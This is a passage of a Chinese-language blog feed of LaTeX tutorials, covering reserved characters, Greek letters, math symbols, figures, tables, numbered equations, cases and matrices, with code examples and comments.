        <content type="html"><![CDATA[<h4 id="1-保留字符"><a href="#1-保留字符" class="headerlink" title="1.保留字符"></a>1.保留字符</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% # $ % ^ &amp; _ &#123; &#125; ~ \</span></span><br><span class="line"><span class="comment">% 对于上述保留字符 采用转义字符“\”来实现输出 </span></span><br></pre></td></tr></table></figure><h4 id="2-希腊字母"><a href="#2-希腊字母" class="headerlink" title="2.希腊字母"></a>2.希腊字母</h4><div class="table-container"><table><thead><tr><th>希腊字母小写、大写</th><th>LaTeX形式</th><th>希腊字母小写、大写</th><th>LaTeX形式</th></tr></thead><tbody><tr><td>α   <strong><em>A</em></strong></td><td>\alpha A</td><td>μ  <strong><em>N</em></strong></td><td>\mu N</td></tr><tr><td>β  <strong><em>B</em></strong></td><td>\beta B</td><td>ξ  Ξ</td><td>\xi \Xi</td></tr><tr><td>γ  Γ</td><td>\gamma \Gamma</td><td><strong>o</strong> <strong><em>O</em></strong></td><td>o O</td></tr><tr><td>δ  Δ</td><td>\delta \ Delta</td><td>π  Π</td><td>\pi  \Pi</td></tr><tr><td>ϵ  ε  <strong><em>E</em></strong></td><td>\epsilon E</td><td>ρ  ϱ  <strong><em>P</em></strong></td><td>\rho P</td></tr><tr><td>ζ  <strong><em>Z</em></strong></td><td>\zeta Z</td><td>σ  Σ</td><td>\sigma \Sigma</td></tr><tr><td>η  <strong><em>H</em></strong></td><td>\eta H</td><td>τ  <strong><em>T</em></strong></td><td>\tau T</td></tr><tr><td>θ  ϑ  Θ</td><td>\theta \Theta</td><td>υ  Υ</td><td>\upsilon \Upsilon</td></tr><tr><td>ι  <strong><em>I</em></strong></td><td>\iota I</td><td>ϕ  φ  Φ</td><td>\phi \Phi</td></tr><tr><td>κ  <strong><em>K</em></strong></td><td>\kappa K</td><td>χ   <strong><em>X</em></strong></td><td>\chi X</td></tr><tr><td>λ  Λ</td><td>\lambda \Lambda</td><td>ψ  Ψ</td><td>\psi \Psi</td></tr><tr><td>μ  <strong><em>M</em></strong></td><td>\mu M</td><td>ω  Ω</td><td>\omega  \Omega</td></tr></tbody></table></div><h4 id="3-集合相关"><a href="#3-集合相关" class="headerlink" title="3.集合相关"></a>3.集合相关</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">mathbb</span><span class="string">&#123;R&#125;</span></span> <span class="comment">%特殊集合符号R 还有\mathbb&#123;z&#125;和\mathbb&#123;N&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subset</span></span>  <span class="comment">%真包含⊂  \supset表示反方向⊃</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subseteq</span></span>  <span class="comment">%包含 ⊆</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">in</span></span>  <span class="comment">%属于∈  %\notin表示不属于</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">cap</span></span>  <span class="comment">%交集  ∩</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">cup</span></span>  <span class="comment">%并集  ∪</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">mid</span></span>  <span class="comment">% |</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">neg</span></span>  <span class="comment">%集合中非  ¬</span></span><br></pre></td></tr></table></figure><h4 id="4-二元运算符"><a href="#4-二元运算符" class="headerlink" title="4.二元运算符"></a>4.二元运算符</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">ge</span></span> <span class="comment">%  ≥</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">le</span></span> <span class="comment">%  ≤</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">equiv</span></span> <span class="comment">%  ≡</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">approx</span></span>  <span class="comment">%  ≈</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">cdot</span></span>  <span class="comment">%  ⋅</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">pm</span></span>  <span class="comment">%  ±</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">div</span></span>  <span class="comment">%  ÷</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">frac</span><span class="string">&#123;&#125;</span><span class="string">&#123;&#125;</span></span> <span class="comment">%分数运算</span></span><br></pre></td></tr></table></figure><h4 id="5-大尺寸运算符"><a href="#5-大尺寸运算符" class="headerlink" title="5.大尺寸运算符"></a>5.大尺寸运算符</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%\sum求和符合  \prod求积符号</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line">    p = <span class="tag">\<span class="name">sum</span></span>_&#123;n=1&#125;^Na_n </span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">%\int表示积分符号</span></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">int</span></span>_&#123;1&#125;^&#123;<span class="tag">\<span class="name">infty</span></span>&#125; $</span> <span class="comment">%\infty表示无穷</span></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">int</span></span>_&#123;E&#125; fdx $</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%\lim表示极限符号</span></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">lim</span></span>_&#123;n<span class="tag">\<span class="name">to</span></span> 0&#125; $</span></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">lim</span></span><span class="tag">\<span class="name">limits</span></span>_&#123;n<span class="tag">\<span class="name">to</span></span> <span class="tag">\<span class="name">infty</span></span>&#125;<span class="tag">\<span class="name">int</span></span>_&#123;E&#125;f_n dx <span class="tag">\<span class="name">geq</span></span> <span class="tag">\<span class="name">int</span></span>_&#123;E&#125;gdx $</span></span><br></pre></td></tr></table></figure><h4 id="6-其它符号"><a href="#6-其它符号" class="headerlink" title="6.其它符号"></a>6.其它符号</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%箭头符号</span></span><br><span class="line"><span class="tag">\<span class="name">leftarrow</span></span>  <span class="comment">%  往左箭头 或者用\gets</span></span><br><span class="line"><span class="tag">\<span class="name">rightarrow</span></span>  <span class="comment">%  往右箭头 或者用\to</span></span><br><span class="line"><span class="tag">\<span class="name">longleftarrow</span></span>  <span class="comment">%  往右加长箭头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%下列点的输出可用于矩阵</span></span><br><span class="line"><span class="tag">\<span class="name">dots</span></span>  <span class="comment">%  三点横向排列 或者用\cdots</span></span><br><span class="line"><span class="tag">\<span class="name">vdots</span></span>  <span class="comment">%  三点竖向排列</span></span><br><span class="line"><span class="tag">\<span class="name">ddots</span></span>  <span class="comment">%  三点斜向排列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%下列符号用于证明</span></span><br><span class="line"><span class="tag">\<span class="name">forall</span></span>  <span class="comment">%    任意∀</span></span><br><span class="line"><span class="tag">\<span class="name">exists</span></span>  <span class="comment">%    存在∃</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%导数相关</span></span><br><span class="line"><span class="tag">\<span class="name">partial</span></span> x  <span class="comment">%  偏导符号</span></span><br><span class="line"><span class="tag">\<span class="name">mathrm</span><span class="string">&#123;d&#125;</span></span> x  <span class="comment">%  求导符号</span></span><br><span class="line">x^&#123;’&#125;  <span class="comment">%  撇形式的求导符号</span></span><br><span class="line"><span class="tag">\<span class="name">dot</span></span> x  <span class="comment">%  点形式的求导符号 \ddot表示2个点 \dddot表示三个点 几个d就是几个点</span></span><br><span class="line"><span class="tag">\<span class="name">nabla</span></span> f  <span class="comment">%  全微分算子</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LaTeX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX输出图表</title>
      <link href="/2020/08/26/LaTeX%E8%BE%93%E5%87%BA%E5%9B%BE%E8%A1%A8/"/>
      <url>/2020/08/26/LaTeX%E8%BE%93%E5%87%BA%E5%9B%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="1-输出图片"><a href="#1-输出图片" class="headerlink" title="1.输出图片"></a>1.输出图片</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%单张图片的输出</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;figure&#125;</span><span class="string">[H]</span></span>  <span class="comment">%  H代图片就在当前位置 在某些情况下由于一页已经排不下，图片会自动调到其他地方，加上该参数可以避免</span></span><br><span class="line"><span class="tag">\<span class="name">centering</span></span>  <span class="comment">%  表示图片居中</span></span><br><span class="line"><span class="tag">\<span class="name">includegraphics</span><span class="string">[width=5in]</span><span class="string">&#123;1.png&#125;</span></span>  <span class="comment">% 图片宽度 可以用height参数控制高度  1.png表示图片位置，将图片至于figures文件夹下</span></span><br><span class="line"><span class="tag">\<span class="name">caption</span><span class="string">&#123;问题二流程图&#125;</span></span>  <span class="comment">%图片名称</span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;figure&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">%多张图片的输出(两张图片并排)</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;figure&#125;</span><span class="string">[H]</span></span></span><br><span class="line">    <span class="tag">\<span class="name">begin</span><span class="string">&#123;minipage&#125;</span><span class="string">[t]</span><span class="string">&#123;0.5\linewidth&#125;</span></span></span><br><span class="line">        <span class="tag">\<span class="name">centering</span></span></span><br><span class="line">        <span class="tag">\<span class="name">includegraphics</span><span class="string">[width=3in]</span><span class="string">&#123;4.png&#125;</span></span></span><br><span class="line">        <span class="tag">\<span class="name">label</span><span class="string">&#123;fig:side:a&#125;</span></span> <span class="comment">%控制图片位置</span></span><br><span class="line">         <span class="comment">% \caption&#123;fig2&#125;为两张图分别加标题图片</span></span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;minipage&#125;</span></span><span class="comment">%</span></span><br><span class="line">    <span class="tag">\<span class="name">begin</span><span class="string">&#123;minipage&#125;</span><span class="string">[t]</span><span class="string">&#123;0.5\linewidth&#125;</span></span></span><br><span class="line">        <span class="tag">\<span class="name">centering</span></span></span><br><span class="line">        <span class="tag">\<span class="name">includegraphics</span><span class="string">[width=3in]</span><span class="string">&#123;5.png&#125;</span></span></span><br><span class="line">        <span class="tag">\<span class="name">label</span><span class="string">&#123;fig:side:b&#125;</span></span></span><br><span class="line">        <span class="comment">% \caption&#123;fig2&#125;为两张图分别加标题图片</span></span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;minipage&#125;</span></span><span class="comment">%</span></span><br><span class="line">    <span class="tag">\<span class="name">caption</span><span class="string">&#123;$\theta$角与$A_i$角关系示意图&#125;</span></span> <span class="comment">%两张图片共享一个题目</span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;figure&#125;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-输出表格"><a href="#2-输出表格" class="headerlink" title="2.输出表格"></a>2.输出表格</h4><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% array用法  \hline表示水平线，而竖线可以使用|来表示</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;array&#125;</span><span class="string">&#123;|c|c|&#125;</span></span> <span class="comment">%表示表格的宽度为2个字符</span></span><br><span class="line">        <span class="tag">\<span class="name">hline</span></span> </span><br><span class="line">        0 &amp; 1 <span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">hline</span></span></span><br><span class="line">        1 &amp; 0 <span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">hline</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;array&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">% \quad和\hspace&#123;&#125;都是表示空格，但是空的个数不同</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;array&#125;</span><span class="string">&#123;cc&#125;</span></span></span><br><span class="line">        (A)<span class="tag">\<span class="name">quad</span></span> 4 &amp; <span class="tag">\<span class="name">hspace</span><span class="string">&#123;4cm&#125;</span></span>(B)<span class="tag">\<span class="name">quad</span></span> 3<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">        (B)<span class="tag">\<span class="name">quad</span></span> 2 &amp; <span class="tag">\<span class="name">hspace</span><span class="string">&#123;4cm&#125;</span></span>(D)<span class="tag">\<span class="name">quad</span></span> 1</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;array&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">%table用法</span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;table&#125;</span><span class="string">[htbp]</span></span></span><br><span class="line">    <span class="tag">\<span class="name">centering</span></span>  <span class="comment">% 显示位置为中间</span></span><br><span class="line">    <span class="tag">\<span class="name">caption</span><span class="string">&#123;standard table&#125;</span></span>  <span class="comment">% 表格标题</span></span><br><span class="line">    <span class="tag">\<span class="name">label</span><span class="string">&#123;table1&#125;</span></span>  <span class="comment">% 用于索引表格的标签</span></span><br><span class="line">    <span class="comment">%字母的个数对应列数，|代表分割线</span></span><br><span class="line">    <span class="comment">% l代表左对齐，c代表居中，r代表右对齐</span></span><br><span class="line">    <span class="tag">\<span class="name">begin</span><span class="string">&#123;tabular&#125;</span><span class="string">&#123;cccc&#125;</span></span>  </span><br><span class="line">        <span class="tag">\<span class="name">hline</span></span>  <span class="comment">% 表格的横线</span></span><br><span class="line">        &amp; &amp; &amp; <span class="tag">\<span class="name">\</span><span class="string">[-6pt]</span></span>  <span class="comment">%可以避免文字偏上 调整文字与上边界的距离</span></span><br><span class="line">        1&amp;2&amp;3&amp;4 <span class="tag">\<span class="name">\</span></span>  <span class="comment">% 表格中的内容，用&amp;分开，\\表示下一行</span></span><br><span class="line">        <span class="tag">\<span class="name">hline</span></span></span><br><span class="line">        &amp; &amp; &amp; <span class="tag">\<span class="name">\</span><span class="string">[-6pt]</span></span>  <span class="comment">%可以避免文字偏上 </span></span><br><span class="line">        0.1&amp;0.2&amp;0.3&amp;0.4 <span class="tag">\<span class="name">\</span></span></span><br><span class="line">        <span class="tag">\<span class="name">hline</span></span></span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;tabular&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;table&#125;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">%输出三线表格</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;table&#125;</span><span class="string">[!htbp]</span></span></span><br><span class="line">  <span class="tag">\<span class="name">caption</span><span class="string">[标签名]</span><span class="string">&#123;中文标题&#125;</span></span></span><br><span class="line">  <span class="tag">\<span class="name">begin</span><span class="string">&#123;tabular&#125;</span><span class="string">&#123;cc...c&#125;</span></span></span><br><span class="line">    <span class="tag">\<span class="name">toprule</span><span class="string">[1.5pt]</span></span></span><br><span class="line">    表头第1个格 &amp; 表头第2个格 &amp; ... &amp; 表头第n个格 <span class="tag">\<span class="name">\</span></span></span><br><span class="line">    <span class="tag">\<span class="name">midrule</span><span class="string">[1pt]</span></span></span><br><span class="line">    表中数据(1,1) &amp; 表中数据(1,2) &amp; ... &amp; 表中数据(1,n)<span class="tag">\<span class="name">\</span></span></span><br><span class="line">    表中数据(2,1) &amp; 表中数据(2,2) &amp; ... &amp; 表中数据(2,n)<span class="tag">\<span class="name">\</span></span></span><br><span class="line">    ...................................................<span class="tag">\<span class="name">\</span></span></span><br><span class="line">    表中数据(m,1) &amp; 表中数据(m,2) &amp; ... &amp; 表中数据(m,n)<span class="tag">\<span class="name">\</span></span></span><br><span class="line">    <span class="tag">\<span class="name">bottomrule</span><span class="string">[1.5pt]</span></span></span><br><span class="line">  <span class="tag">\<span class="name">end</span><span class="string">&#123;tabular&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;table&#125;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LaTeX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LaTex输出公式</title>
      <link href="/2020/08/24/LaTex%E8%BE%93%E5%87%BA%E5%85%AC%E5%BC%8F/"/>
      <url>/2020/08/24/LaTex%E8%BE%93%E5%87%BA%E5%85%AC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="1-无编号公式"><a href="#1-无编号公式" class="headerlink" title="1.无编号公式"></a>1.无编号公式</h4><h5 id="1-1-行内公式"><a href="#1-1-行内公式" class="headerlink" title="1.1 行内公式"></a>1.1 行内公式</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">随机变量<span class="formula">$X$</span>的分布函数为<span class="formula">$F(x)$</span>，求出它的对应的密度函数<span class="formula">$f(x)$</span></span><br></pre></td></tr></table></figure><h5 id="1-2-行间公式"><a href="#1-2-行间公式" class="headerlink" title="1.2 行间公式"></a>1.2 行间公式</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们熟知的勾股定理是：<span class="formula">$$a^2 + b^2 = c^2$$</span></span><br></pre></td></tr></table></figure><h4 id="2-有编号公式"><a href="#2-有编号公式" class="headerlink" title="2.有编号公式"></a>2.有编号公式</h4><h5 id="2-1-手动编号"><a href="#2-1-手动编号" class="headerlink" title="2.1 手动编号"></a>2.1 手动编号</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$$a^2 + b^2 = c^2 <span class="tag">\<span class="name">tag</span><span class="string">&#123;1.1&#125;</span></span>$$</span></span><br><span class="line"><span class="formula">$$a^2 + b^2 = c^2 <span class="tag">\<span class="name">tag</span><span class="string">&#123;no.1&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure><h5 id="2-2自动编号"><a href="#2-2自动编号" class="headerlink" title="2.2自动编号"></a>2.2自动编号</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line">    a^2 + b^2 = c^2</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span></span><br></pre></td></tr></table></figure><h5 id="2-3-等式对齐"><a href="#2-3-等式对齐" class="headerlink" title="2.3 等式对齐"></a>2.3 等式对齐</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%  使用align参数</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">    x +  y = 1<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    2x + y <span class="tag">\<span class="name">neq</span></span> 1<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    3x +4y <span class="tag">\<span class="name">leq</span></span> 2<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    4x <span class="tag">\<span class="name">geq</span></span> y</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span></span><br></pre></td></tr></table></figure><h5 id="2-4-分开输入"><a href="#2-4-分开输入" class="headerlink" title="2.4 分开输入"></a>2.4 分开输入</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line">    <span class="tag">\<span class="name">begin</span><span class="string">&#123;split&#125;</span></span>  <span class="comment">%  使用split参数 当公式太长 可以分段输出</span></span><br><span class="line">        (x + y)(x + 4y) &amp; = x^2 + 4xy + xy + 4y^2<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">                &amp; = x^2 +5xy + 4y^2</span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;split&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span></span><br></pre></td></tr></table></figure><h5 id="2-5-分类输入"><a href="#2-5-分类输入" class="headerlink" title="2.5 分类输入"></a>2.5 分类输入</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line">    a_&#123;i1&#125;A_&#123;j1&#125; + a_&#123;i2&#125;A_&#123;j2&#125; + <span class="tag">\<span class="name">cdots</span></span> + a_&#123;in&#125;A_&#123;jn&#125; = </span><br><span class="line">    <span class="tag">\<span class="name">begin</span><span class="string">&#123;cases&#125;</span></span>  <span class="comment">%  cases参数可用于输出分段函数，即大括号公式</span></span><br><span class="line">        <span class="tag">\<span class="name">begin</span><span class="string">&#123;vmatrix&#125;</span></span>A<span class="tag">\<span class="name">end</span><span class="string">&#123;vmatrix&#125;</span></span>，&amp; i =j<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">        0, &amp; i <span class="tag">\<span class="name">neq</span></span> j</span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;cases&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line"><span class="comment">%  使用cases参数时只会对括号公式进行一次编号，但如果每个情况的公式都要有编号，可以使用numcases参数，但是要在专门的latex套件中调用cases宏包</span></span><br></pre></td></tr></table></figure><h5 id="2-6-矩阵的输入"><a href="#2-6-矩阵的输入" class="headerlink" title="2.6 矩阵的输入"></a>2.6 矩阵的输入</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%  无外边框</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;array&#125;</span><span class="string">&#123;ccc&#125;</span></span></span><br><span class="line">    1 &amp; 0 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 1 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 0 &amp; 1<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;array&#125;</span></span>  </span><br><span class="line"><span class="comment">%  有外边框[ ]</span></span><br><span class="line"><span class="formula">$$</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">left</span><span class="string">[</span></span></span></span><br><span class="line"><span class="formula"><span class="tag"><span class="string">    \begin&#123;array&#125;&#123;ccc&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag"><span class="string">        1 &amp; 0 &amp; 0\\\\</span></span></span></span><br><span class="line"><span class="formula"><span class="tag"><span class="string">        0 &amp; 1 &amp; 0\\\\</span></span></span></span><br><span class="line"><span class="formula"><span class="tag"><span class="string">        0 &amp; 0 &amp; 1\\\\</span></span></span></span><br><span class="line"><span class="formula"><span class="tag"><span class="string">    \end&#123;array&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag"><span class="string">\right]</span></span></span></span><br><span class="line"><span class="formula">$$</span> </span><br><span class="line"><span class="comment">%  简化写法</span></span><br><span class="line"><span class="comment">%  带()的矩阵</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;pmatrix&#125;</span></span></span><br><span class="line">    1 &amp; 0 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 1 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 0 &amp; 1<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;pmatrix&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">%  带[]的矩阵</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;bmatrix&#125;</span></span></span><br><span class="line">    1 &amp; 0 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 1 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 0 &amp; 1<span class="tag">\<span class="name">\</span></span><span 